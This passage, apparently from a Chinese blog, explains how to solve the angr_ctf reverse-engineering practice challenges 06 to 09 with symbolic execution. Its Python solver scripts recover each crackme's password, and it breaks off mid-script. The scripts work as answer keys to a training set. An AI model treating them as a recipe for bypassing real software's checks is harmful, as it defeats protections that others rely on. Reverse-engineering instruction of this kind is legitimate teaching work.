<h2 id="06-angr-symbolic-dynamic-memory：符号化动态分配内存"><a href="#06-angr-symbolic-dynamic-memory：符号化动态分配内存" class="headerlink" title="06_angr_symbolic_dynamic_memory：符号化动态分配内存"></a>06_angr_symbolic_dynamic_memory：符号化动态分配内存</h2><p>惯例拖入 IDA 中，还是惯例地读入输入后 complex 处理后进行对比，不过不一样的是本题存储输入使用的是<strong>动态分配的内存</strong>：</p>
<p><img src="https://s2.loli.net/2022/10/31/dQEJzTtXKWZaPLV.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么怎么处理呢？我们可以从储存这两块内存的指针的地址入手，注意到两个指针 <code>buffer0</code> 与 <code>buffer1</code> 是两个全局变量：</p>
<p><img src="https://s2.loli.net/2022/10/31/XkKs9MjUmh2yGbw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<ul>
<li>将初始状态设为<strong>读取完输入后的状态</strong></li>
<li>任意选两个地址作为 fake chunk 的地址，并将这两个 buffer 指针指向 fake chunk</li>
<li>再在 fake chunk 内存上放置相应的内存符号变量进行求解即可</li>
</ul>
<p>因为符号执行不会实际执行程序，所以这里我们任意设置 fake chunk 地址并不会导致 segmentation fault 的发生，需要注意的是对于具体的值而言我们别忘了通过 <code>endness</code> 参数指定大小端序</p>
<p>于是最后的解题脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./06_angr_symbolic_dynamic_memory&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x804938C # first insn after scanf()<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # set the buffer0&#x27;s and buffer1&#x27;s val to our specific address<br>    buf0_addr = 0x9B20684<br>    buf1_addr = 0x9B2068C<br>    fake_chunk0_addr = 0x1145140<br>    fake_chunk1_addr = 0x1919810<br>    init_state.memory.store(buf0_addr,fake_chunk0_addr, endness=proj.arch.memory_endness)<br>    init_state.memory.store(buf1_addr,fake_chunk1_addr, endness=proj.arch.memory_endness)<br>    <br>    # create symbolic vals and set fake_chunk to them<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 64) # 8 bytes = 64 bits<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 64) # 8 bytes = 64 bits<br>    init_state.memory.store(fake_chunk0_addr, password_0)<br>    init_state.memory.store(fake_chunk1_addr, password_1)<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x8049452, avoid = 0x8049440)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0, cast_to=bytes)<br>        solution_1 = solution_state.solver.eval(password_1, cast_to=bytes)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是秒解：</p>
<p><img src="https://s2.loli.net/2022/10/31/6Oyk2cTxbDjpYVE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="07-angr-symbolic-file：符号化文件"><a href="#07-angr-symbolic-file：符号化文件" class="headerlink" title="07_angr_symbolic_file：符号化文件"></a>07_angr_symbolic_file：符号化文件</h2><p>惯例拖入 IDA 中，发现其会先读入 64 字节，之后通过 <code>ignoreme()</code> 将其写入一个特定文件中，再从该文件中把输入读回来，之后就又是常规的 complex 操作一番后与一个特定字符串进行比对</p>
<p><img src="https://s2.loli.net/2022/10/31/snWIloVkGtUxcdz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>比较容易想到的方法就是<strong>直接从文件读入结束后开始作为初始状态</strong>，之后用 05 的符号化内存的方法来求解，不过这样就不是这道题出题的目的了：）</p>
<h3 id="Emulated-Filesystem-angr-的文件系统"><a href="#Emulated-Filesystem-angr-的文件系统" class="headerlink" title="Emulated Filesystem - angr 的文件系统"></a>Emulated Filesystem - angr 的文件系统</h3><p>在 angr 当中与文件系统间的操作是通过 <code>SimFile</code> 对象完成的，SimFile 为对  <em>存储</em>  的抽象模型，一个 SimFile 对象可以表示一系列的字节、符号等</p>
<p>我们可以通过 <code>angr.SimFile()</code> 来创建一个模拟文件，创建带有具体值与符号变量的 SimFile 🌰如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr, claripy<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="hljs-string">&#x27;a_file&#x27;</span>, content = <span class="hljs-string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="hljs-string">&#x27;another_file&#x27;</span>, bvs, size=<span class="hljs-number">8</span>) <span class="hljs-comment"># size in bytes there</span><br></code></pre></td></tr></table></figure>

<p>模拟文件需要与特定的状态进行关联，通过 <code>state.fs.insert(sim_file)</code>  我们可以将 SimFile 插入到一个状态的文件系统中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="hljs-string">&#x27;test_file&#x27;</span>, sim_file)<br></code></pre></td></tr></table></figure>

<p>我们还可以从文件中读取内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pos = <span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure>

<p>对于  <em>流</em>  （Streams，例如标准IO、TCP连接等）类型的文件，我们可以用 <code>angr.SimPackets()</code> 来创建：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="hljs-string">&#x27;my_packet&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet<br>&lt;angr.storage.file.SimPackets <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f75626a2e80</span>&gt;<br></code></pre></td></tr></table></figure>



<h3 id="FINAL-EXPLOIT-3"><a href="#FINAL-EXPLOIT-3" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么本题实际上是让我们利用 angr 来创建一个<strong>模拟文件</strong>以模拟读取文件的过程，这里我们将初始状态设为从打开文件开始，之后创建一个位向量符号放入模拟文件并将模拟文件插入文件系统，之后探索到对应状态后求解即可，解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./07_angr_symbolic_file&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_address = <span class="hljs-number">0x8049550</span> <span class="hljs-comment"># first insn returned from ignoreme()</span><br>    init_state = proj.factory.blank_state(addr = start_address)<br><br>    <span class="hljs-comment"># create BVS and SimFile</span><br>    file_size = <span class="hljs-number">0x40</span><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, file_size * <span class="hljs-number">8</span>) <span class="hljs-comment"># 0x40 bytes</span><br>    file_name = <span class="hljs-string">&#x27;KBECVEJF.txt&#x27;</span><br>    sim_file = angr.storage.SimFile(file_name, password, size = file_size)<br><br>    <span class="hljs-comment"># load the SimFile</span><br>    init_state.fs.insert(file_name, sim_file)<br><br>    <span class="hljs-comment"># solve it</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find the solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是秒解：</p>
<p><img src="https://s2.loli.net/2022/10/31/lTfoUMzQANGSbnH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x03-angr-ctf：约束条件"><a href="#0x03-angr-ctf：约束条件" class="headerlink" title="0x03. angr-ctf：约束条件"></a>0x03. angr-ctf：约束条件</h1><h2 id="08-angr-constraints：添加约束"><a href="#08-angr-constraints：添加约束" class="headerlink" title="08_angr_constraints：添加约束"></a>08_angr_constraints：添加约束</h2><p>惯例拖入 IDA，还是读入输入后 complex 函数处理后进行比对的模式，这里的 <code>0x804C040</code> 就是 <code>buffer</code> 的地址，不过其自定义了一个对比函数：</p>
<p><img src="https://s2.loli.net/2022/10/31/4DXMH3GIQdiZOwC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>自定义的对比函数比较常规，其中的 <code>0x804C030</code> 便是 <code>password</code> 的地址：</p>
<p><img src="https://s2.loli.net/2022/10/31/sxXtqvHYyiN5COg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在 <code>check_equals_xx()</code> 函数当中由于其选择了逐字符比较后增加计数的比较方式的缘故，会导致 <strong>路径爆炸</strong>（path explosion）的问题</p>
<h3 id="angr-中的约束"><a href="#angr-中的约束" class="headerlink" title="angr 中的约束"></a>angr 中的约束</h3><p>前面我们讲到位向量之间可以进行运算，类似地，位向量之间也可以进行<strong>比较运算</strong> ，其结果为 <code>Bool</code> 类型的对象：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv == bvv2<br>&lt;Bool <span class="hljs-literal">True</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs == bvv + bvv2<br>&lt;Bool bvs_0_32 == <span class="hljs-number">0xbd5b7dde</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&#x27;bvs2&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 &gt; bvs * bvv + bvv2<br>&lt;Bool bvs2_1_32 &gt; bvs_0_32 * <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure>

<p>对于带有符号值的比较而言， <code>Bool</code> 类型的对象直接表示了对应的式子，因此可以作为<strong>约束条件</strong>被添加到一个状态当中，我们可以通过 <code>state.solver.add()</code> 为对应状态添加约束：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs == bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs2 &gt; bvs * bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.<span class="hljs-built_in">eval</span>(bvs2) <span class="hljs-comment"># get the concrete value under constraints</span><br></code></pre></td></tr></table></figure>

<p>除了 Bool 类以外，Claripy 还提供了一些以位向量作为结果的运算操作，以下是一个🌰（完整的还是去读<a target="_blank" rel="noopener" href="https://docs.angr.io/advanced-topics/claripy">文档</a>吧）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>claripy.If(bvs == bvs2, bvs, bvs2)<br>&lt;BV32 <span class="hljs-keyword">if</span> bvs_0_32 == bvs2_1_32 then bvs_0_32 <span class="hljs-keyword">else</span> bvs2_1_32&gt;<br></code></pre></td></tr></table></figure>



<h3 id="FINAL-EXPLOIT-4"><a href="#FINAL-EXPLOIT-4" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>由于待比较字符串是固定的，故我们可以让 <code>explore()</code> 在完成对输入的变换后、在进入比较函数之前停下，之后直接为该状态手动添加一个对应的约束后进行求解即可</p>
<p>这里添加约束的方法是使用 <code>state.memory.load(addr, size_in_bytes)</code> 成员函数将当前状态的某个内存区域作为一个 BVS 提取出来，之后通过 <code>state.add_constraints(condition)</code> 添加约束指定该块内存在当前状态下的值为特定字符串，最后使用 <code>state.solver.eval()</code> 求解原来的 buffer 即可</p>
<p>最终的解题脚本如下，详见注释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./08_angr_constraints&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_addr = <span class="hljs-number">0x804935D</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    <span class="hljs-comment"># BVS for buffer</span><br>    buffer_addr = <span class="hljs-number">0x804C040</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># explore to check_equals()</span><br>    check_addr = <span class="hljs-number">0x80493A9</span> <span class="hljs-comment"># last insn before call check_equals() </span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = check_addr)<br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment"># get the buffer BVS of check_state</span><br>    password = check_state.memory.load(buffer_addr, buffer_size)<br>    compared_str = <span class="hljs-string">&quot;EFJLFOGMURLEVNXN&quot;</span><br><br>    <span class="hljs-comment"># add and solve the constraints</span><br>    check_state.add_constraints(password == compared_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是秒解：</p>
<p><img src="https://s2.loli.net/2022/11/01/Lh5YzU3RPyD2ZTW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x04-angr-ctf：函数操作"><a href="#0x04-angr-ctf：函数操作" class="headerlink" title="0x04. angr-ctf：函数操作"></a>0x04. angr-ctf：函数操作</h1><h2 id="09-angr-hooks：函数替换"><a href="#09-angr-hooks：函数替换" class="headerlink" title="09_angr_hooks：函数替换"></a>09_angr_hooks：函数替换</h2><p>惯例拖入 IDA，程序大概的主体逻辑是读入 buffer 后经过 <code>complex_function()</code> 运算，之后通过 <code>check_equals()</code> 与 password 进行对比并把结果存到 <code>equals</code> 变量当中；之后将 password 经过 <code>complex_function()</code> 运算，随后再读入 buffer 与 password 进行对比；两个条件都符合了才会输出 <code>&quot;Good Job.&quot;</code> </p>
<p>其中 <code>0x804C044</code> 就是 buffer 的地址，<code>0x804C034</code> 就是 password 的地址</p>
<p><img src="https://s2.loli.net/2022/11/02/sIjxptNAr7ZCeuo.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>其中 <code>check_equals()</code> 逻辑比较简单，就算简单的与 password 进行对比，不过由于是<strong>逐字符对比</strong>后增加统计数量，因此会导致<strong>路径爆炸</strong>：</p>
<p><img src="https://s2.loli.net/2022/11/02/5NAMaSsoHVZ4geL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>如果是像 02 那样直接求解，<code>check_equals()</code> 带来的路径爆炸会非常令人头大，而该函数的功能本质上就仅是与一个字符串进行对比，因此我们可以<strong>使用 angr 来 hook 掉该函数，自行实现等价的操作函数</strong></p>
<h3 id="project-hook-函数钩子"><a href="#project-hook-函数钩子" class="headerlink" title="project.hook() - 函数钩子"></a>project.hook() - 函数钩子</h3><p>有的时候我们会有需要 hook 掉某个函数的需求，此时我们可以使用 <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> 来 hook 掉对应的 call 指令，其中 <code>call_insn_addr</code> 为 call 指令的地址，<code>my_function</code> 为我们的自定义函数， <code>length</code> 为 call 指令的长度：</p>
<p><img src="https://s2.loli.net/2022/11/02/Y5ptBU8oAsTdj7c.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>我们的自定义函数应当为接收 <code>state</code> 作为参数的函数，angr 还提供了 decorator 语法糖，因此以下两种写法都可以：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># method 1</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params"><span class="hljs-number">0x1234</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br><br><span class="hljs-comment"># method 2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func2</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br>proj.hook(addr = <span class="hljs-number">0x5678</span>, hook = my_hook_func2, length = <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>

<h3 id="FINAL-EXPLOIT-5"><a href="#FINAL-EXPLOIT-5" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>因此本题我们只需要 hook 掉比较函数便能解决路径爆炸的问题，我们使用 <code>claripy.If()</code> 创建一个比较并将值给到 eax 寄存器作为返回值，最后就是常规的内存符号化后求解即可，最终的求解脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    start_addr = <span class="hljs-number">0x804937D</span> <span class="hljs-comment"># first insn after first scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># because we have passed the qmemcpy() that initial the password&#x27;s memory,</span><br>    <span class="hljs-comment"># so we need to do it manually</span><br>    password_size = <span class="hljs-number">0x10</span><br>    password_addr = <span class="hljs-number">0x804C034</span><br>    init_state.memory.store(password_addr,<br>                            claripy.BVV(<span class="hljs-built_in">int</span>.from_bytes(compared_str, <span class="hljs-string">&quot;big&quot;</span>), <br>                                        password_size * <span class="hljs-number">8</span>))<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># eax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x80493D3</span>) <span class="hljs-comment"># first insn after my_hook_func() returned</span><br><br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br>    check_state.add_constraints(check_state.regs.eax == <span class="hljs-number">1</span>) <span class="hljs-comment"># constraint for eval == 1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password0: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br>    <span class="hljs-comment"># now we need to calculate the password&#x27;s val after complex()</span><br>    simgr2 = proj.factory.simgr(check_state)<br>    simgr2.explore(find = <span class="hljs-number">0x8049428</span>) <span class="hljs-comment"># last insn before second scanf()</span><br><br>    check_state2 = simgr2.found[<span class="hljs-number">0</span>]<br>    password = check_state2.memory.load(password_addr, password_size)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password1: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state2.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是秒解：</p>
<p><img src="https://s2.loli.net/2022/11/02/xHpXA6WNqwisaLT.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>当然，还有一种更加简洁的写法就是 hook 掉 <code>check_equals()</code> 之后直接从 <code>entry_state</code> 开始 explore() 到输出 <code>&quot;Good Job.&quot;</code> ，但笔者在刚开始写的时候是没想到的…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span 